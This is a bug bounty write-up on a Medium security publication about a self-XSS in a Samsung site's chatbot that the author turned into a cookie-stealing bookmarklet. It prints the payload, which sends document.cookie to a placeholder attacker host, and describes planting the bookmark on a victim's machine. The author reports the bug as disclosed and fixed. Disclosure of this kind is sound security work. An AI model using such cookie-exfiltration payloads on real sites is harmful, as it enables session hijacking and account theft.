---
title: Reflected XSS using Bookmark
url: https://infosecwriteups.com/reflected-xss-using-bookmark-937cf27c5725?source=rss----7b722bfd1b8d--bug_bounty
source: Bug Bounty in InfoSec Write-ups on Medium
date: 2025-04-21
fetch_date: 2025-10-06T22:03:56.014508
---

# Reflected XSS using Bookmark

[Sitemap](/sitemap/sitemap.xml)

[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F937cf27c5725&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderCollection&%7Estage=mobileNavBar&source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Freflected-xss-using-bookmark-937cf27c5725&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

[Medium Logo](https://medium.com/?source=post_page---top_nav_layout_nav-----------------------------------------)

[Write](https://medium.com/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav------------------)

[Search](https://medium.com/search?source=post_page---top_nav_layout_nav-----------------------------------------)

Sign up

[Sign in](https://medium.com/m/signin?operation=login&redirect=https%3A%2F%2Finfosecwriteups.com%2Freflected-xss-using-bookmark-937cf27c5725&source=post_page---top_nav_layout_nav-----------------------global_nav------------------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)

[## InfoSec Write-ups](https://infosecwriteups.com/?source=post_page---publication_nav-7b722bfd1b8d-937cf27c5725---------------------------------------)

·

Follow publication

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:76:76/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_sidebar-7b722bfd1b8d-937cf27c5725---------------------------------------)

A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: <https://weekly.infosecwriteups.com/>

Follow publication

# Reflected XSS using Bookmark

[![cryptoshant🇮🇳](https://miro.medium.com/v2/resize:fill:64:64/1*WB_W42RWlz5rAUWNCTByiw.png)](https://medium.com/%40dsmodi484?source=post_page---byline--937cf27c5725---------------------------------------)

[cryptoshant🇮🇳](https://medium.com/%40dsmodi484?source=post_page---byline--937cf27c5725---------------------------------------)

4 min read

·

Apr 19, 2025

--

6

Listen

Share

Hello Hackers! In this write-up, I am going to share an amazing reflected XSS (RXSS) bug which I chained using the bookmark functionality. It was marked as Out Of Scope, and to successfully exploit this bug, user interaction was required, resulting in very low impact. However, I still learned new things, so I want to share it with you! I hope you learn something new. Let’s get started!

Press enter or click to view image in full size

![]()

**Part 1: Initial Discovery** 🕵️‍♂️

As usual, I was hunting on Samsung subdomains, and during Google dorking, I found a subdomain called `https://semiconductor.samsung.com/`. There wasn't much functionality on this subdomain, but my attention was drawn to their chatbot, called Nanona.

Press enter or click to view image in full size

![]()

nanona chatbot

**Nanona Chatbot**

After analyzing the chatbot and trying multiple XSS payloads, all worked successfully, even a simple payload like `<script>alert(1)</script>`. Initially, I was very happy when the little popup appeared. Now, I tried every possible way to escalate this self-XSS to reflected XSS by trying CSRF, CORS, and many other trial-and-error methods, but nothing worked! Sadly! 😥

After some days, I thought, “Why not look at the JS files?” So, I just pressed F12 and tried to monitor network traffic and also the console output, and all that stuff. One thing caught my attention 👀! Whatever I typed into the chatbot was also printing in the console, and if we wrote an XSS payload, it was also executing.

Press enter or click to view image in full size

![]()

printing in console 👀

Now, after looking at the JS file more deeply, I found the function that prints exactly what we have typed in the console, which looks like this:

![]()

Looking even deeper, I finally understood the full idea of how things worked. For example, when you use this command: `CHATBOT.displayUserInput('hello');` and paste it into the console, it is directly reflected onto the webpage. So basically, we can send a payload through `CHATBOT.displayUserInput`, and it will pop up on the website.

> **Note: While making this write-up, the bug was already fixed, so I cannot show you proof or popups, but I have a POC which I have attached at the end of this write-up. So, just understand the process.**

So, when I sent this into the console: `CHATBOT.displayUserInput('hello');`, the webpage looked like this:

Press enter or click to view image in full size

![]()

Now, this was still a self-XSS, and I was unable to steal the cookie of other users. Then, I told all these things to one of my friends, and he helped me to make this complexity a little bit lower.

**Part 2: Bookmark Power** 🔥

After searching on Google, ChatGPT, and all that, we came up with the idea of a bookmark. Actually, ChatGPT helped us more. Then, after trial and error, we arrived at the final payload to put into the bookmark:

```
Payload in bookmark:
javascript:CHATBOT.displayUserInput('<img src="x" onerror="new Image().src=\'https://attacker_website_.com?cookie=\'+document.cookie">');
```

So, we went to the settings in Firefox and created a new bookmark with the payload in this way, as you can see in the screenshot, and then saved it!

Press enter or click to view image in full size

![]()

malicious bookmark

### Part-3 Attack Scenario👾

Now, what is going to happen, you might be thinking? So, I, as an attacker, would bookmark this malicious link on your (the victim’s) computer. Whenever you visit the particular Samsung site and click on this specific bookmark, this bookmark is going to execute in the console (in the developer tools), and it will automatically send the victim’s cookies to my server (an attacker-controlled server). And our attack was successful ✅.

I know you might be thinking that this still has very low severity or no severity. I also know this, so I again searched to create a script that would automatically add a bookmark into the victim’s browser. However, after research, I found that newer versions of browsers do not support this functionality or restrict running this type of script. But still, if users are using older versions of browsers, then it is indeed possible to make this attack easily. But I quickly reported all the details with all the information. And the team told me this:

Press enter or click to view image in full size

![]()

And I totally agree with them! This is the end!

### **Part-4 Working POC 😉**

I hope you also learned something new today! While this had more attack complexity, during your journey, it might not be so complex. Who knows? 👨‍💻 While hunting on any target, don’t hesitate to use any AI. Try to think of different ways to exploit a bug. I will see you in the next one!

bye👋

[Cybersecurity](https://medium.com/tag/cybersecurity?source=post_page-----937cf27c5725---------------------------------------)

[Bug Bounty](https://medium.com/tag/bug-bounty?source=post_page-----937cf27c5725---------------------------------------)

[Hacking](https://medium.com/tag/hacking?source=post_page-----937cf27c5725---------------------------------------)

[Samsung](https://medium.com/tag/samsung?source=post_page-----937cf27c5725---------------------------------------)

[Journey](https://medium.com/tag/journey?source=post_page-----937cf27c5725---------------------------------------)

--

--

6

[![InfoSec Write-ups](https://miro.medium.com/v2/resize:fill:96:96/1*SWJxYWGZzgmBP1D0Qg_3zQ.png)](https://infosecwriteups.com/?source=post_page---post_publication_info--937cf27c5725---------------------------------------)

[![InfoSec...